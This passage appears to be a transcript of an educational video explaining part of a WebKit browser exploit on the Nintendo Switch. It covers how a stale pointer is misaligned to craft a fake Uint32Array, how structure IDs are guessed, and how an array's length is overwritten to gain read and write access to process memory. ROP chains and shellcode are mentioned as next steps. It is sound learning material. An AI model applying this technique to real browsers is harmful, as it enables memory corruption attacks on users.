[12:32] Nontheless, because my exploit was very unstable
I tried to see if the value is maybe different
[12:38] and the phrack article shows a technique how
to do that.
[12:41] Back to the new object for a second.
[12:44] So this will allocate a new object with 4
properties that looks like this in memory.
[12:49] 0x69, or in decimal 105, then zero, the pointer
to the smash array, which we allocated way
[12:58] at the beginning and 0x100.
[13:02] The function u2d is a clever little helper.
[13:06] As every number in javascript is basically
a float, we can create a new dataview of 16bytes,
[13:12] so 64bit, set the high and the low 32bits
and return the float representation of those
[13:18] bytes.
[13:19] This new object creation will also overwrite
stale[0].
[13:24] Just a few seconds ago I mentioned that stale[0]
points to a JSValue representing a number,
[13:29] but now it was overwritten with a JSValue
representing a pointer.
[13:33] A pointer to the JSObject that was just created.
[13:37] This JSObject it points to is not very interesting
for us.
[13:40] It’s not an arbitrary object we have crafted.
[13:44] But remember, that the JSValue with the pointer
to this object is in the memory that is overlapped
[13:50] by the buf.
[13:53] This means we can use buf to manipulate the
pointer.
[13:55] And what we do is, we add 0x10 or decimal
16, which moves the pointer into the properties
[14:02] of the JSObject.
[14:04] Now suddenly the 0x69 is the JSCell value.
[14:08] And the zero here is the butterfly.
[14:10] And the smsh address becomes the vector, the
pointer where the actual array is in memory.
[14:16] To be clear this points into the similar struct
of that array, so this doesn’t point into
[14:20] the memory location of that smash array, but
also into this JSObject struct with its vector
[14:27] pointer and its length.
[14:28] And 0x100 is the length of that array, which
is actually just the Object structure of the
[14:35] smash array.
[14:36] So now you know how we can misalign the pointer
to this object, which will interpret the properties
[14:42] here as the actual object.
[14:44] This means we can now try different structureIDs
in a loop and check with instanceof if we
[14:46] have crafted a Uint32Array.
[14:47] We remember the original stale[0] pointer
in stale[1], then missalign stale[0], then
[14:52] we can check the type of the stale[0] object,
if it’s not correct, we increment our structureID
[14:58] guess, and assign a new value to the stale[1]
‘a’ property, which will look like the
[15:05] StructureID from the missaligned pointer in
stale[0].
[15:08] What we basically created now is, we have
two pointers in stale.
[15:14] Which slightly overlap in memory.
[15:15] We also have somwhere an array called smsh.
[15:19] We have also set the memory location for our
crafted array, the vector pointer, to point
[15:25] to smsh.
[15:26] To the smash structure, not the actual memory
location of the smash array.
[15:31] This means we have another object that we
can fully control.
[15:36] Stale is an array.
[15:37] The first element of stale points to a crafted
Uint32Array.
[15:41] So when we access the elements of that array,
we obviously access the 32bit values of the
[15:47] smsh JSObject structure.
[15:49] And as you know, the object contains 64bit
values, and the fourth 64bit value is the
[15:57] length of the smsh array.
[15:59] So stale[0] of [0] and [1] would be the first
64bit, 2,3 would be the second 64 bit, 4,5
[16:06] would be the third 64bit and 6,7 would be
the 4th 64bit.
[16:12] So with stale[0][6] we can overwrite the length
of the smash array.
[16:17] And we can now check the length of the smsh
array.
[16:21] Let’s try this on the switch.
[16:23] We load the page and it might not immediately
work, but it will refresh and try again.
[16:31] Ok so we triggered the bug and we found overlapping
memory by looking for the 0x41414242 value.
[16:42] Now we check the current length of smash,
we craft our object, try to find the structure
[16:45] id, we actually find it’s 105, so I didn’t
have to go through this trouble of iterating
[16:46] over them, then we change the length of smsh
and print the smsh length again.
[16:51] And it changed.
[16:52] Isn’t this crazy!
[16:54] So now we can just modify the vector where
the smash array points to in the exact same
[16:59] way, and then simply read the raw data it
points to from the smsh array.
[17:03] or write to the smash array.
[17:05] It gives us super simple access to the whole
memory of the process.
[17:09] Next steps could be to find the address of
the browser binary in memory to dump it.
[17:14] Maybe find some function pointers in memory
you can overwrite, create a ROP chain or maybe
[17:15] even shellcode because we should have jitted
code, I guess?
[17:16] This video is already crazy long.
[17:17] So let’s stop here for now.
[17:18] I really learned a lot working through the
first part of qwerty’s exploit.
[17:21] I hope this this also gives you a sense for
how frckn complicated these modern memory
[17:26] corruption exploits are and what kind of work
and knowledge is required to do them.
[17:30] I only scratched the surface here.
[17:32] I hope this also increases your respect for
the people who do this kind of research.
[17:37] At this point I also want to thank Retr0id
and Ando who I just met on IRC and were in
[17:42] the same boat as me and we and we helped eachother
trying to figure how this works.
[17:47] And also a huge thank you to qwerty, who answered
a lot of my noob questions and shared his
[17:52] progress with me.
[17:53] I really appreciate you supporting somebody
who tries to learn this!
[17:57] If this sounds like fun to you, make sure
you read the phrack paper by samuel groß,
[18:02] or saelo about “attacking javascript engines”,
which gives a way more in depth insight into
[18:08] how this works.
[18:09] There is also another article more specifically
about firefox, which is different from webkit,
[18:14] but also gives you a better idea of how browsers
w ork.
[18:18] Thank you very much, keep on hackin’ in
the free world, and doot doola doot doo.
